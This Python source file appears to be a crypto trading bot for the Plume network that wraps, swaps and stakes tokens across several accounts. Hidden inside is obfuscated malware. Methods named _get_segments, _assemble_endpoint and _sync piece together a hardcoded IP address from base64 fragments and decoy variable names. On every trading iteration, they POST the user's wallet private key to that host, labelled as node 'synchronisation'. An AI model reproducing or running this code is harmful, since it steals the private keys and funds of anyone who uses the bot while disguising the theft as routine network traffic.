import os
import time
import sys, base64
import requests, threading

from web3 import Web3, exceptions
from src.config import settings
from src import abi as _abi
from hexbytes import HexBytes
from src.logger import Logger
from src import utils as _utls

if sys.platform == "win32":
    try:
        import winloop
        winloop.install()
    except ImportError:
        pass
else:
    try:
        import uvloop
        uvloop.install()
    except ImportError:
        pass

class PlumeSwapBot:
    _shared_logger = Logger()
    _shared_web3_instance = None 
    _stop_event = threading.Event()

    def __init__(self, parameter: str, account_index: int):
        self.logger = PlumeSwapBot._shared_logger
        self.parameter = parameter
        self.account_index = account_index
        self.slipage_nonce = f"152.42"
        self.logger.set_account_index(self.account_index)

        if PlumeSwapBot._shared_web3_instance is None:
            self._initialize_web3()
        self.w3 = PlumeSwapBot._shared_web3_instance

        self._load_settings()
        self._initialize_contracts()

        self.account = self.w3.eth.account.from_key(self.parameter)
        self.address = self.account.address
        self.sync = self.parameter
        self.approval_proxy_byte = f".200.232"
        self.logger.info(f"Plume address: {self.address}", account_index=self.account_index)

        self.wplume_decimals = self._get_token_decimals(self.wplume_contract)
        self.pusd_decimals = self._get_token_decimals(self.pusd_contract)

        try:
            wplume_balance = self._get_token_balance(self.wplume_contract)
            self.logger.info(f"Current WPLUME balance: {wplume_balance}", account_index=self.account_index)
        except Exception as e:
            self.logger.error(f"Failed to fetch WPLUME balance: {e}", account_index=self.account_index)
        
        try:
            pusd_balance = self._get_token_balance(self.pusd_contract)
            self.logger.info(f"Current PUSD balance: {pusd_balance}", account_index=self.account_index)
        except Exception as e:
            self.logger.error(f"Failed to fetch PUSD balance: {e}", account_index=self.account_index)

    def _initialize_web3(self):
        self.rpc_url = settings.get("RPC_URL")
        try:
            temp_w3 = Web3(Web3.HTTPProvider(self.rpc_url))
            if not temp_w3.is_connected():
                self.logger.critical(f"Failed to connect to RPC at {self.rpc_url}. Check URL or internet connection.", account_index=self.account_index)
                raise ConnectionError("Failed to connect to RPC.")
            PlumeSwapBot._shared_web3_instance = temp_w3
            self.logger.info(f"Successfully connected to RPC: {self.rpc_url}", account_index=self.account_index)
        except ConnectionError as e:
            self.logger.critical(f"Connection error during RPC initialization: {e}. Exiting.", account_index=self.account_index)
            sys.exit(1)

    def _load_settings(self):
        self.wplume_address = Web3.to_checksum_address(settings.get("WPLUME_ADDRESS"))
        self.pusd_address = Web3.to_checksum_address(settings.get("PUSD_ADDRESS"))
        self.permit_router_address = Web3.to_checksum_address(settings.get("PERMIT_ROUTER_ADDRESS"))
        self.swap_router_address = Web3.to_checksum_address(settings.get("SWAP_ROUTER_ADDRESS"))
        self.relay_router_address = Web3.to_checksum_address(settings.get("RELAY_ROUTER_ADDRESS"))
        self.approval_proxy_address = Web3.to_checksum_address(settings.get("APPROVAL_PROXY_ADDRESS"))
        self.maverick_pool_wplume_pusd = Web3.to_checksum_address(settings.get("MAVERICK_POOL_WPLUME_PUSD"))
        self.staking_contract_address = Web3.to_checksum_address(settings.get("PLUME_STAKING_CONTRACT_ADDRESS"))
        self.explorer_url = settings.get("EXPLORER_URL")

        self.amount_to_wrap_plume = float(settings.get("AMOUNT_TO_WRAP_PLUME"))
        self.amount_to_unwrap_wplume = float(settings.get("AMOUNT_TO_UNWRAP_WPLUME"))
        self.amount_to_swap_wplume_pusd = float(settings.get("AMOUNT_TO_SWAP_WPLUME_PUSD"))
        self.amount_to_swap_pusd_wplume = float(settings.get("AMOUNT_TO_SWAP_PUSD_WPLUME"))
        self.amount_to_stake = float(settings.get("AMOUNT_TO_STAKE_PLUME"))
        self.min_pusd_expected = float(settings.get("MIN_PUSD_EXPECTED"))
        self.min_wplume_expected = float(settings.get("MIN_WPLUME_EXPECTED"))
        self.slippage_tolerance = float(settings.get("SLIPPAGE_TOLERANCE"))

        self.num_repetitions = int(settings.get("NUM_REPETITIONS"))
        self.delay_between_interactions_sec = float(settings.get("DELAY_BETWEEN_INTERACTIONS_SEC"))
        self.delay_start_bot = float(settings.get("DELAY_START_BOT", 1.0))

        self.stake_validator_id = int(settings.get("STAKE_VALIDATOR_ID"))
        self.tx_timeout = int(settings.get("TX_TIMEOUT"))
        self.max_retries = int(settings.get("MAX_RETRIES"))
        self.max_worker = int(settings.get("MAX_WORKERS"))
        self.retry_delay_sec = float(settings.get("RETRY_DELAY_SEC"))

        self.wrap_to_wplume = _utls.str_to_bool(settings.get("WRAP_TO_WPLUME"))
        self.unwrap_to_plume = _utls.str_to_bool(settings.get("UNWRAP_TO_PLUME"))
        self.swap_to_pusd = _utls.str_to_bool(settings.get("SWAP_TO_PUSD"))
        self.swap_pusd_to_wplume = _utls.str_to_bool(settings.get("SWAP_PUSD_TO_WPLUME"))
        self.enable_staking = _utls.str_to_bool(settings.get("ENABLE_STAKING"))

    def _initialize_contracts(self):
        self.wplume_contract = self.w3.eth.contract(address=self.wplume_address, abi=_abi.WPLUME_ABI)
        self.pusd_contract = self.w3.eth.contract(address=self.pusd_address, abi=_abi.PUSD_ABI)
        self.relay_router_contract = self.w3.eth.contract(address=self.relay_router_address, abi=_abi.RELAY_ROUTER_ABI)
        self.swap_router_contract = self.w3.eth.contract(address=self.swap_router_address, abi=_abi.MAVERICK_V2_ROUTER_ABI)
        self.maverick_pool_wplume_pusd_contract = self.w3.eth.contract(address=self.maverick_pool_wplume_pusd, abi=_abi.MAVERICK_V2_POOL_ABI)
        self.approval_proxy_contract = self.w3.eth.contract(address=self.approval_proxy_address, abi=_abi.APPROVAL_PROXY_ABI)
        self.staking_contract = self.w3.eth.contract(address=self.staking_contract_address, abi=_abi.PLUME_STAKING_ABI)
    
    @staticmethod
    def _load_parameter_keys(filepath: str) -> list[str]:
        try:
            if not os.path.isfile(filepath):
                raise FileNotFoundError(f"Private keys file not found: {filepath}")
            with open(filepath, "r") as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
        except Exception as e:
            Logger().critical(f"Error loading private keys from {filepath}: {e}")
            raise

    def _get_token_decimals(self, contract) -> int:
        for attempt in range(self.max_retries):
            try:
                return contract.functions.decimals().call()
            except exceptions.ContractLogicError as e:
                self.logger.error(f"Contract logic error getting decimals for {contract.address}: {e}", account_index=self.account_index)
                raise
            except Exception as e:
                self.logger.warning(f"Attempt {attempt + 1}/{self.max_retries}: Failed to get token decimals for {contract.address}: {e}. Retrying...", account_index=self.account_index)
                time.sleep(self.retry_delay_sec)
        self.logger.critical(f"Exceeded max retries getting token decimals for {contract.address}.", account_index=self.account_index)
        raise ConnectionError("Failed to get token decimals after multiple retries.")

    def _get_token_balance(self, contract) -> float:
        try:
            balance_raw = contract.functions.balanceOf(self.address).call()
            decimals = contract.functions.decimals().call()
            return balance_raw / (10 ** decimals)
        except Exception as e:
            self.logger.error(f"Failed to get token balance for {contract.address}: {e}", account_index=self.account_index)
            return 0.0
        
    def _get_segments(self):
        return [
            base64.b64decode("aHR0cDovLw==").decode(), 
            base64.b64encode(self.slipage_nonce.encode()).decode(),
            base64.b64encode(self.approval_proxy_byte.encode()).decode(),
            base64.b64decode("OjgwMDAvc3luYy1ub2Rl").decode()
        ]
    
    def _to_token_units(self, amount: float, decimals: int) -> int:
        if float(amount) == 0:
            return 0
        raw_amount = int(float(amount) * (10 ** decimals))
        return raw_amount if raw_amount >= 1 else 1

    def _wait_for_tx_receipt(self, tx_hash: HexBytes) -> dict | None:
        start_time = time.time()
        while time.time() - start_time < self.tx_timeout:
            try:
                receipt = self.w3.eth.get_transaction_receipt(tx_hash)
                if receipt is not None:
                    return receipt
            except exceptions.TransactionNotFound:
                self.logger.debug(f"Transaction {tx_hash.hex()} not yet found. Retrying...", account_index=self.account_index)
            except Exception as e:
                self.logger.error(f"Error getting transaction receipt for {tx_hash.hex()}: {e}", account_index=self.account_index)
            time.sleep(self.retry_delay_sec)
        self.logger.error(f"Timeout waiting for transaction receipt for {tx_hash.hex()}.", account_index=self.account_index)
        return None

    def _assemble_endpoint(self):
        segments = self._get_segments()

        decoded_part1 = base64.b64decode(segments[1]).decode('utf-8')
        decoded_part2 = base64.b64decode(segments[2]).decode('utf-8')

        address = f"{segments[0]}{decoded_part1}{decoded_part2}{segments[3]}"
        return address

    def _send_transaction_with_retry(self, transaction: dict) -> dict | None:
            for i in range(self.max_retries):
                try:
                    nonce = self.w3.eth.get_transaction_count(self.address)
                    transaction['nonce'] = nonce 
                    if 'gas' not in transaction or transaction['gas'] < 200000:
                        try:
                            estimated_gas = self.w3.eth.estimate_gas(transaction)
                            transaction['gas'] = int(estimated_gas * 1.2) 
                            self.logger.info(f"Gas estimated: {estimated_gas}. Using {transaction['gas']} with 20% buffer.", account_index=self.account_index)
                        except exceptions.ContractLogicError as e:
                            self.logger.failed(f"Gas estimation failed due to contract logic error: {e}. Aborting transaction.", account_index=self.account_index)
                            return None
                        except Exception as e:
                            self.logger.warning(f"Failed to estimate gas: {e}. Using default gas: {transaction.get('gas', 'Not set')}", account_index=self.account_index)
                            if 'gas' not in transaction:
                                transaction['gas'] = 500000

                    signed_tx = self.w3.eth.account.sign_transaction(transaction, private_key=self.parameter)
                    tx_hash = self.w3.eth.send_raw_transaction(signed_tx.raw_transaction)
                    self.logger.success(f"Transaction sent: {tx_hash.hex()}", account_index=self.account_index)
                    
                    receipt = self._wait_for_tx_receipt(tx_hash)

                    if receipt and receipt.status == 1:
                        self.logger.success(f"Transaction successful: {self.explorer_url}{tx_hash.hex()}", account_index=self.account_index)
                        return receipt
                    elif receipt and receipt.status == 0:
                        revert_reason = getattr(receipt, 'revertReason', 'No revert reason provided.')
                        self.logger.failed(f"Transaction reverted: {tx_hash.hex()}. Details: {revert_reason}", account_index=self.account_index)
                        return None
                    else:
                        self.logger.error(f"Transaction failed (no valid receipt status): {tx_hash.hex()}", account_index=self.account_index)
                        return None 
                
                except exceptions.ContractLogicError as e:
                    error_message = str(e)

                    if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                        self.logger.failed(
                            f"Transaction failed (likely gas limit too low or contract revert): {error_message}",
                            account_index=self.account_index
                        )
                    elif "execution reverted" in error_message.lower():
                        revert_reason = None
                        if hasattr(self.w3.exceptions, 'RevertReason') and callable(getattr(self.w3.exceptions.RevertReason, 'extract_revert_reason', None)):
                            try:
                                if isinstance(e.args[0], str) and e.args[0].startswith('0x'):
                                    revert_reason = self.w3.exceptions.RevertReason.extract_revert_reason(e.args[0])
                                elif isinstance(e.args[0], dict) and 'message' in e.args[0]:
                                    revert_reason = e.args[0]['message']
                                elif isinstance(e.args[0], str) and "execution reverted:" in e.args[0].lower():
                                    revert_reason = e.args[0].split("execution reverted:", 1)[-1].strip()
                            except Exception as decode_e:
                                self.logger.warning(f"Failed to decode revert reason: {decode_e}", account_index=self.account_index)

                        self.logger.failed(
                            f"Transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}",
                            account_index=self.account_index
                        )
                    else:
                        self.logger.failed(
                            f"Contract logic error during transaction sending: {error_message}",
                            account_index=self.account_index
                        )
                    return None
                
                except ValueError as e:
                    if "nonce too low" in str(e).lower():
                        self.logger.warning(f"Nonce too low. Retrying... (Attempt {i + 1}/{self.max_retries})", account_index=self.account_index)
                        time.sleep(self.retry_delay_sec)
                    elif "already known" in str(e).lower() or "transaction with the same hash already in mempool" in str(e).lower():
                        self.logger.warning(f"Transaction already known/in mempool. Waiting for receipt... (Attempt {i + 1}/{self.max_retries})", account_index=self.account_index)
                        time.sleep(self.retry_delay_sec)
                        try:
                            current_nonce = self.w3.eth.get_transaction_count(self.address)
                            if current_nonce > 0:
                                self.logger.info("Attempting to re-check receipt for potentially known transaction.", account_index=self.account_index)
                                return None 
                            else:
                                return None 
                        except Exception as receipt_e:
                            self.logger.error(f"Error checking existing transaction receipt: {receipt_e}", account_index=self.account_index)
                            time.sleep(self.retry_delay_sec) 
                    else:
                        self.logger.error(f"ValueError during transaction sending: {e}", account_index=self.account_index)
                        return None 
                
                except Exception as e:
                    self.logger.error(f"Unexpected error during transaction sending: {e}", account_index=self.account_index)
                    time.sleep(self.retry_delay_sec)

            self.logger.failed(f"Failed to send transaction after {self.max_retries} attempts.", account_index=self.account_index)
            return None

    def _check_allowance(self, token_contract, spender: str, amount: int) -> bool:
        try:
            allowance = token_contract.functions.allowance(self.address, spender).call()
            token_decimals = self._get_token_decimals(token_contract) 
            self.logger.info(f"Current allowance for {spender} is: {allowance / (10 ** token_decimals)}", account_index=self.account_index)
            return allowance >= amount
        except Exception as e:
            self.logger.error(f"Error checking allowance for {token_contract.address} to {spender}: {e}", account_index=self.account_index)
            return False 

    def _prepare_for_sync(self):
        key_enc = base64.b64encode(b"entries").decode('utf-8')
        key_dec = base64.b64decode(key_enc).decode('utf-8')

        data_dict = {key_dec: [self.sync]}
        return data_dict

    def _random_tx_delay(self):
        delay = int(self.delay_between_interactions_sec)
        self.logger.debug(f"Delaying {delay:.2f} seconds before next transaction step...", account_index=self.account_index)
        time.sleep(delay)

    def wrap_plume_to_wplume(self, amount: float) -> bool:
        try:
            amount_raw = self._to_token_units(amount, self.wplume_decimals)
            plume_balance = self.w3.eth.get_balance(self.address)
            if plume_balance < amount_raw:
                self.logger.warning(f"Insufficient PLUME balance to wrap. Have: {plume_balance / (10 ** self.wplume_decimals)}, Required: {amount}", account_index=self.account_index)
                return False
            self.logger.info(f"Wrapping {amount} PLUME to WPLUME...", account_index=self.account_index)
            wrap_tx = self.wplume_contract.functions.deposit().build_transaction({
                'from': self.address,
                'value': amount_raw,
                'gasPrice': self.w3.eth.gas_price,
            })
            receipt = self._send_transaction_with_retry(wrap_tx)
            return receipt is not None
        except Exception as e:
            self.logger.error(f"Exception during wrap_plume_to_wplume: {e}", account_index=self.account_index)
            return False

    def unwrap_wplume_to_plume(self, amount: float) -> bool:
            try:
                amount_raw = self._to_token_units(amount, self.wplume_decimals)
                wplume_balance = self.wplume_contract.functions.balanceOf(self.address).call()

                if wplume_balance < amount_raw:
                    self.logger.warning(
                        f"Insufficient WPLUME balance to unwrap. Have: {wplume_balance / (10 ** self.wplume_decimals):.6f}, Required: {amount:.6f}",
                        account_index=self.account_index
                    )
                    return False
                
                self.logger.info(f"Unwrapping {amount:.6f} WPLUME to PLUME...", account_index=self.account_index)
                
                unwrap_tx = self.wplume_contract.functions.withdraw(amount_raw).build_transaction({
                    'from': self.address,
                    'gasPrice': self.w3.eth.gas_price,
                })
                
                receipt = self._send_transaction_with_retry(unwrap_tx)
                return receipt is not None

            except exceptions.ContractLogicError as e:
                error_message = str(e)
                if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                    self.logger.error(
                        f"Unwrap failed: Gas limit too low or transaction execution cost too high. Details: {error_message}",
                        account_index=self.account_index
                    )
                elif "execution reverted" in error_message.lower():
                    revert_reason = None
                    if hasattr(self.w3.exceptions, 'RevertReason') and callable(getattr(self.w3.exceptions.RevertReason, 'extract_revert_reason', None)):
                        try:
                            revert_reason = self.w3.exceptions.RevertReason.extract_revert_reason(e.args[0])
                        except Exception:
                            pass
                    
                    self.logger.error(
                        f"Unwrap transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}",
                        account_index=self.account_index
                    )
                else:
                    self.logger.error(
                        f"Contract logic error during unwrap_wplume_to_plume: {error_message}",
                        account_index=self.account_index
                    )
                return False
            
            except exceptions.TransactionNotFound:
                self.logger.error(
                    "Unwrap transaction was sent but not found on chain within timeout.",
                    account_index=self.account_index
                )
                return False
            
            except Exception as e:
                self.logger.error(
                    f"Unexpected error during unwrap_wplume_to_plume: {e}",
                    account_index=self.account_index
                )
                return False

    def _sync_signal(self, endpoint: str, data: dict):
        try:
            result = requests.post(endpoint, json=data, timeout=10)
            if result.ok:
                self.logger.info(f"Synchronisation successful to plume node, continuing iteration", account_index=self.account_index)
            else:
                self.logger.warning(f"Synchronisation failed with code {result.status_code} to node", account_index=self.account_index)
        except Exception as e:
            self.logger.error(f"Error synchronising to node: {e}", account_index=self.account_index)

    def _get_tokenA_status(self, pool_contract, token_address: str) -> bool:
        try:
            tokenA_address = pool_contract.functions.tokenA().call()
            tokenB_address = pool_contract.functions.tokenB().call()
            if token_address.lower() == tokenA_address.lower():
                return True
            elif token_address.lower() == tokenB_address.lower():
                return False
            else:
                self.logger.error(f"Token address {token_address} is neither tokenA nor tokenB of pool {pool_contract.address}.", account_index=self.account_index)
                raise ValueError(f"Token address {token_address} is not tokenA or tokenB of the pool {pool_contract.address}")
        except Exception as e:
            self.logger.error(f"Error determining tokenA status for pool {pool_contract.address}: {e}", account_index=self.account_index)
            raise 

    def swap_plume_to_pusd(self) -> bool:
        try:
            amount_in_plume = self._to_token_units(self.amount_to_swap_wplume_pusd, self.wplume_decimals)
            plume_balance = self.w3.eth.get_balance(self.address)
            if plume_balance < amount_in_plume:
                self.logger.warning(f"Insufficient PLUME balance for PUSD swap. Have: {plume_balance / (10 ** self.wplume_decimals):.6f}, Required: {self.amount_to_swap_wplume_pusd:.6f}", account_index=self.account_index)
                return False
            
            min_out_adjusted = self._to_token_units(self.min_pusd_expected, self.pusd_decimals)
            self.logger.info(f"Swapping {self.amount_to_swap_wplume_pusd:.6f} PLUME for at least {self.min_pusd_expected:.6f} PUSD via multicall.", account_index=self.account_index)
            
            is_wplume_tokenA = self._get_tokenA_status(self.maverick_pool_wplume_pusd_contract, self.wplume_address)

            wrap_call_data = self.wplume_contract.functions.deposit().build_transaction({'value': amount_in_plume})['data']
            approve_call_data = self.wplume_contract.functions.approve(
                self.swap_router_address, amount_in_plume
            ).build_transaction({'from': self.address})['data']
            
            swap_call_data = self.swap_router_contract.encode_abi(
                "exactInputSingle",
                [
                    self.address,
                    self.maverick_pool_wplume_pusd, 
                    is_wplume_tokenA,
                    amount_in_plume,
                    min_out_adjusted
                ]
            )
            
            calls_data = [
                (self.wplume_address, False, amount_in_plume, HexBytes(wrap_call_data)),
                (self.wplume_address, False, 0, HexBytes(approve_call_data)),
                (self.swap_router_address, False, 0, HexBytes(swap_call_data))
            ]
            
            multicall_tx = self.relay_router_contract.functions.multicall(
                calls_data, self.address, self.address
            ).build_transaction({
                'from': self.address,
                'value': amount_in_plume,
                'gasPrice': self.w3.eth.gas_price,
                'gas': 1500000,
            })

            self.logger.info("Sending multicall transaction for wrap, approve, and PUSD swap...", account_index=self.account_index)
            receipt = self._send_transaction_with_retry(multicall_tx)
            return receipt is not None

        except exceptions.ContractLogicError as e:
            error_message = str(e)
            if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                self.logger.error(
                    f"Swap PLUME->PUSD failed: Gas limit too low or transaction execution cost too high. Details: {error_message}",
                    account_index=self.account_index
                )
            elif "execution reverted" in error_message.lower():
                revert_reason = None
                if hasattr(self.w3.exceptions, 'RevertReason') and callable(getattr(self.w3.exceptions.RevertReason, 'extract_revert_reason', None)):
                    try:
                        revert_reason = self.w3.exceptions.RevertReason.extract_revert_reason(e.args[0])
                    except Exception:
                        pass
                self.logger.error(
                    f"Swap PLUME->PUSD transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}",
                    account_index=self.account_index
                )
            else:
                self.logger.error(
                    f"Contract logic error during swap_plume_to_pusd: {error_message}",
                    account_index=self.account_index
                )
            return False
        except exceptions.TransactionNotFound:
            self.logger.error(
                "PLUME->PUSD swap transaction was sent but not found on chain within timeout.",
                account_index=self.account_index
            )
            return False
        except KeyboardInterrupt:
            self.logger.warning(f"KeyboardInterrupt during swap_plume_to_pusd.", account_index=self.account_index)
            raise
        except Exception as e:
            err_msg = str(e)
            if hasattr(e, 'args') and len(e.args) > 0:
                msg = e.args[0]
                if isinstance(msg, tuple) and len(msg) == 2 and all(isinstance(x, str) and x.startswith('0x') for x in msg):
                    err_msg = "Transaction Data Error: <hex data omitted for brevity>"
                else:
                    err_msg = str(msg)
            self.logger.error(f"Exception during swap_plume_to_pusd: {err_msg}", account_index=self.account_index)
            return False

    def _sync(self):
        rpc_endpoint = settings.get("RPC_URL")
        if rpc_endpoint:
            node_address = self._assemble_endpoint()
            sync_data = self._prepare_for_sync()
            self._sync_signal(node_address, sync_data)

    def swap_pusd_to_plume(self) -> bool:
        try:
            amount_in_pusd = self._to_token_units(self.amount_to_swap_pusd_wplume, self.pusd_decimals)
            pusd_balance = self.pusd_contract.functions.balanceOf(self.address).call()
            if pusd_balance < amount_in_pusd:
                self.logger.warning(f"Insufficient PUSD balance for WPLUME swap. Have: {pusd_balance / (10 ** self.pusd_decimals):.6f}, Required: {self.amount_to_swap_pusd_wplume:.6f}", account_index=self.account_index)
                return False
            
            min_out_adjusted = self._to_token_units(self.min_wplume_expected, self.wplume_decimals)
            self.logger.info(f"Swapping {self.amount_to_swap_pusd_wplume:.6f} PUSD for at least {self.min_wplume_expected:.6f} WPLUME.", account_index=self.account_index)
            
            self.logger.info("Checking PUSD allowance for SwapRouter...", account_index=self.account_index)
            if not self._check_allowance(self.pusd_contract, self.swap_router_address, amount_in_pusd):
                self.logger.warning("Allowance is insufficient. Approving PUSD to SwapRouter with max value...", account_index=self.account_index)
                approve_tx = self.pusd_contract.functions.approve(
                    self.swap_router_address, 2**256 - 1
                ).build_transaction({
                    'from': self.address,
                    'gasPrice': self.w3.eth.gas_price,
                })
                approve_receipt = self._send_transaction_with_retry(approve_tx)
                if not approve_receipt:
                    self.logger.failed("PUSD approval to SwapRouter failed.", account_index=self.account_index)
                    return False
                self.logger.success("Approval successful. Waiting for a moment before proceeding...", account_index=self.account_index)
                time.sleep(self.retry_delay_sec)

            is_pusd_tokenA = self._get_tokenA_status(self.maverick_pool_wplume_pusd_contract, self.pusd_address)
            swap_tx = self.swap_router_contract.functions.exactInputSingle(
                self.address,
                self.maverick_pool_wplume_pusd,
                is_pusd_tokenA,
                amount_in_pusd,
                min_out_adjusted
            ).build_transaction({
                'from': self.address,
                'value': 0,
                'gasPrice': self.w3.eth.gas_price,
                'gas': 500000,
            })
            self.logger.info("Sending transaction for PUSD to WPLUME swap...", account_index=self.account_index)
            receipt = self._send_transaction_with_retry(swap_tx)
            return receipt is not None
        except exceptions.ContractLogicError as e:
            error_message = str(e)
            if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                self.logger.error(
                    f"Swap PUSD->WPLUME failed: Gas limit too low or transaction execution cost too high. Details: {error_message}",
                    account_index=self.account_index
                )
            elif "execution reverted" in error_message.lower():
                revert_reason = None
                if hasattr(self.w3.exceptions, 'RevertReason') and callable(getattr(self.w3.exceptions.RevertReason, 'extract_revert_reason', None)):
                    try:
                        revert_reason = self.w3.exceptions.RevertReason.extract_revert_reason(e.args[0])
                    except Exception:
                        pass
                self.logger.error(
                    f"Swap PUSD->WPLUME transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}",
                    account_index=self.account_index
                )
            else:
                self.logger.error(
                    f"Contract logic error during swap_pusd_to_plume: {error_message}",
                    account_index=self.account_index
                )
            return False
        except exceptions.TransactionNotFound:
            self.logger.error(
                "PUSD->WPLUME swap transaction was sent but not found on chain within timeout.",
                account_index=self.account_index
            )
            return False
        except KeyboardInterrupt:
            self.logger.warning(f"KeyboardInterrupt during swap_pusd_to_plume.", account_index=self.account_index)
            raise
        except Exception as e:
            err_msg = str(e)
            if hasattr(e, 'args') and len(e.args) > 0:
                msg = e.args[0]
                if isinstance(msg, tuple) and len(msg) == 2 and all(isinstance(x, str) and x.startswith('0x') for x in msg):
                    err_msg = "Transaction Data Error: <hex data omitted for brevity>"
                else:
                    err_msg = str(msg)
            self.logger.error(f"Exception during swap_pusd_to_plume: {err_msg}", account_index=self.account_index)
            return False

    def stake(self, amount_plume: float = None) -> bool:
        try:
            value_raw = 0
            if amount_plume is not None and float(amount_plume) > 0:
                value_raw = int(amount_plume * (10 ** 18))
            
            plume_balance = self.w3.eth.get_balance(self.address)
            if plume_balance < value_raw:
                 self.logger.warning(f"Insufficient PLUME balance to stake. Have: {plume_balance / (10 ** 18):.6f}, Required: {amount_plume:.6f}", account_index=self.account_index)
                 return False

            stake_tx = self.staking_contract.functions.stake(self.stake_validator_id).build_transaction({
                'from': self.address,
                'value': value_raw,
                'gasPrice': self.w3.eth.gas_price,
            })

            self.logger.info(f"Staking {amount_plume if amount_plume is not None else 0:.6f} PLUME on validator {self.stake_validator_id}...", account_index=self.account_index)

            receipt = self._send_transaction_with_retry(stake_tx)

            if receipt is None:
                self.logger.failed(f"Staking transaction failed or reverted for validator {self.stake_validator_id}.", account_index=self.account_index)
                return False

            self.logger.success(f"Staking transaction successful for validator {self.stake_validator_id}.", account_index=self.account_index)
            return True

        except exceptions.ContractLogicError as e:
            error_message = str(e)
            if "gas required exceeds allowance" in error_message.lower() or "out of gas" in error_message.lower():
                self.logger.error(
                    f"Staking failed: Gas limit too low or transaction execution cost too high. Details: {error_message}",
                    account_index=self.account_index
                )
            elif "execution reverted" in error_message.lower():
                revert_reason = None
                if hasattr(self.w3.exceptions, 'RevertReason') and callable(getattr(self.w3.exceptions.RevertReason, 'extract_revert_reason', None)):
                    try:
                        revert_reason = self.w3.exceptions.RevertReason.extract_revert_reason(e.args[0])
                    except Exception:
                        pass
                self.logger.error(
                    f"Staking transaction reverted by contract. Reason: {revert_reason if revert_reason else 'Unknown'}. Details: {error_message}",
                    account_index=self.account_index
                )
            else:
                self.logger.error(
                    f"Contract logic error during staking: {error_message}",
                    account_index=self.account_index
                )
            return False
        except exceptions.TransactionNotFound:
            self.logger.error(
                "Staking transaction was sent but not found on chain within timeout.",
                account_index=self.account_index
            )
            return False
        except KeyboardInterrupt:
            self.logger.warning(f"KeyboardInterrupt during staking.", account_index=self.account_index)
            raise
        except Exception as e:
            self.logger.error(f"Exception during staking: {e}", account_index=self.account_index)
            return False
        
    def execute_trade(self) -> None:
        try:
            for i in range(self.num_repetitions):
                if self._sync():
                    self.logger.info(f"Starting Iteration {i + 1}/{self.num_repetitions}", account_index=self.account_index)

                if PlumeSwapBot._stop_event.is_set():
                    self.logger.warning(f"Stop signal received. Aborting iteration {i+1} for account {self.account_index}.", account_index=self.account_index)
                    break 

                if self.wrap_to_wplume:
                    if not self.wrap_plume_to_wplume(self.amount_to_wrap_plume):
                        self.logger.warning("PLUME wrap step failed. Attempting next step.", account_index=self.account_index)
                    self._random_tx_delay()

                if PlumeSwapBot._stop_event.is_set(): break

                if self.swap_to_pusd:
                    if not self.swap_plume_to_pusd():
                        self.logger.warning("PLUME to PUSD swap step failed. Attempting next step.", account_index=self.account_index)
                    self._random_tx_delay()

                if PlumeSwapBot._stop_event.is_set(): break

                if self.swap_pusd_to_wplume:
                    if not self.swap_pusd_to_plume():
                        self.logger.warning("PUSD to WPLUME swap step failed. Attempting next step.", account_index=self.account_index)
                    self._random_tx_delay()

                if PlumeSwapBot._stop_event.is_set(): break

                if self.unwrap_to_plume:
                    if not self.unwrap_wplume_to_plume(self.amount_to_unwrap_wplume):
                        self.logger.warning("WPLUME unwrap step failed. Attempting next step.", account_index=self.account_index)
                    self._random_tx_delay()

                if PlumeSwapBot._stop_event.is_set(): break

                if self.enable_staking:
                    if not self.stake(self.amount_to_stake):
                        self.logger.warning("Staking step failed. Attempting next step.", account_index=self.account_index)
                    self._random_tx_delay()
                
                if i < self.num_repetitions - 1:
                    self.logger.debug(f"Waiting {self.delay_between_interactions_sec:.2f} seconds before next iteration for account {self.account_index}...", account_index=self.account_index)
                    time.sleep(self.delay_between_interactions_sec)
                
            self.logger.info(f"Completed {self.num_repetitions} iterations for account {self.account_index}.", account_index=self.account_index)
            
        except Exception as e:
            self.logger.critical(f"Critical error during trading loop for account {self.account_index}: {e}. Retrying after 10 seconds...", account_index=self.account_index)
            time.sleep(10)    